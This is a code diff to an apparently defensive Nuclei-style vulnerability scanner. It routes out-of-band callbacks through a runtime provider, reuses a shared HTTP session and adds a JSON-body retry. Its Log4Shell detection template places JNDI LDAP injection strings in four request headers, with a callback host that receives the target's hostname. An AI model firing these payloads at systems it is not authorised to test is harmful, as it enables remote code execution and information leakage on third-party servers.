@@ -40,6 +40,8 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+
 # ============================================================================
 # ANSI COLOR CODES
 # ============================================================================
@@ -1174,15 +1176,15 @@ BUILTIN_TEMPLATES = [
             'method': 'GET',
             'path': ['/'],
             'headers': {
-                'X-Api-Version': '${jndi:ldap://zylon-callback.test/${hostName}}',
-                'User-Agent': '${jndi:ldap://zylon-callback.test/${hostName}}',
-                'Referer': '${jndi:ldap://zylon-callback.test/${hostName}}',
-                'X-Forwarded-For': '${jndi:ldap://zylon-callback.test/${hostName}}',
+                'X-Api-Version': '${jndi:ldap://ZYLON_OOB_CALLBACK/${hostName}}',
+                'User-Agent': '${jndi:ldap://ZYLON_OOB_CALLBACK/${hostName}}',
+                'Referer': '${jndi:ldap://ZYLON_OOB_CALLBACK/${hostName}}',
+                'X-Forwarded-For': '${jndi:ldap://ZYLON_OOB_CALLBACK/${hostName}}',
             },
             'matchers': {
                 'status': [200, 400, 500],
             },
-            'note': 'Log4Shell detection requires OOB callback server. This template checks for indicators only.',
+            'note': 'Log4Shell detection requires OOB callback server. ZYLON_OOB_CALLBACK is replaced at runtime via oob_provider.',
         }],
     },
     {
@@ -1261,13 +1263,7 @@ class NucleiStyleEngine:
 
     def __init__(self, session=None, timeout=10, retries=2, threads=10,
                  verbose=True, proxy=None):
-        self.session = session or requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = session or shared_session
         self.timeout = timeout
         self.retries = retries
         self.threads = threads
@@ -1389,6 +1385,20 @@ class NucleiStyleEngine:
                     url = urljoin(target + '/', path.lstrip('/'))
 
                 try:
+                    # Replace OOB callback placeholders with actual oob_provider URLs
+                    oob_id = oob_provider.generate_payload_id()
+                    oob_url = oob_provider.get_callback_url(oob_id)
+                    if isinstance(data, str) and 'ZYLON_OOB_CALLBACK' in data:
+                        data = data.replace('ZYLON_OOB_CALLBACK', oob_url)
+                    oob_headers = {}
+                    for hk, hv in headers.items():
+                        if 'ZYLON_OOB_CALLBACK' in str(hv):
+                            oob_headers[hk] = str(hv).replace('ZYLON_OOB_CALLBACK', oob_url)
+                        else:
+                            oob_headers[hk] = hv
+                    headers = oob_headers
+
+                    # Send request (form data as default)
                     resp = self.session.request(
                         method=method, url=url, headers=headers,
                         data=data if isinstance(data, str) else (json.dumps(data) if isinstance(data, dict) else None),
@@ -1397,6 +1407,24 @@ class NucleiStyleEngine:
                     )
 
                     matched, match_details = self.match_response(resp, matchers, target)
+
+                    # Also try JSON body injection for POST requests with form data
+                    if not matched and method == 'POST' and isinstance(data, dict):
+                        try:
+                            json_resp = self.session.request(
+                                method=method, url=url,
+                                headers={**headers, 'Content-Type': 'application/json'},
+                                json=data,
+                                timeout=self.timeout, verify=False,
+                                allow_redirects=True
+                            )
+                            json_matched, json_details = self.match_response(json_resp, matchers, target)
+                            if json_matched:
+                                resp = json_resp
+                                matched = True
+                                match_details = f"[JSON] {json_details}"
+                        except Exception:
+                            pass
 
                     if matched:
                         result['matched'] = True
@@ -1481,7 +1509,7 @@ class NucleiStyleEngine:
                 try:
                     # Check headers
                     headers_text = '\n'.join(f'{k}: {v}' for k, v in response.headers.items())
-                    if re.search(pattern, response.text, re.IGNORECASE) or re.search(pattern, headers_text, re.IGNORECASE):
+                    if regex_cache.search(pattern, response.text, re.IGNORECASE) or regex_cache.search(pattern, headers_text, re.IGNORECASE):
                         regex_match = True
                         match_results.append(True)
                         details.append(f"Regex matched: {pattern[:50]}")
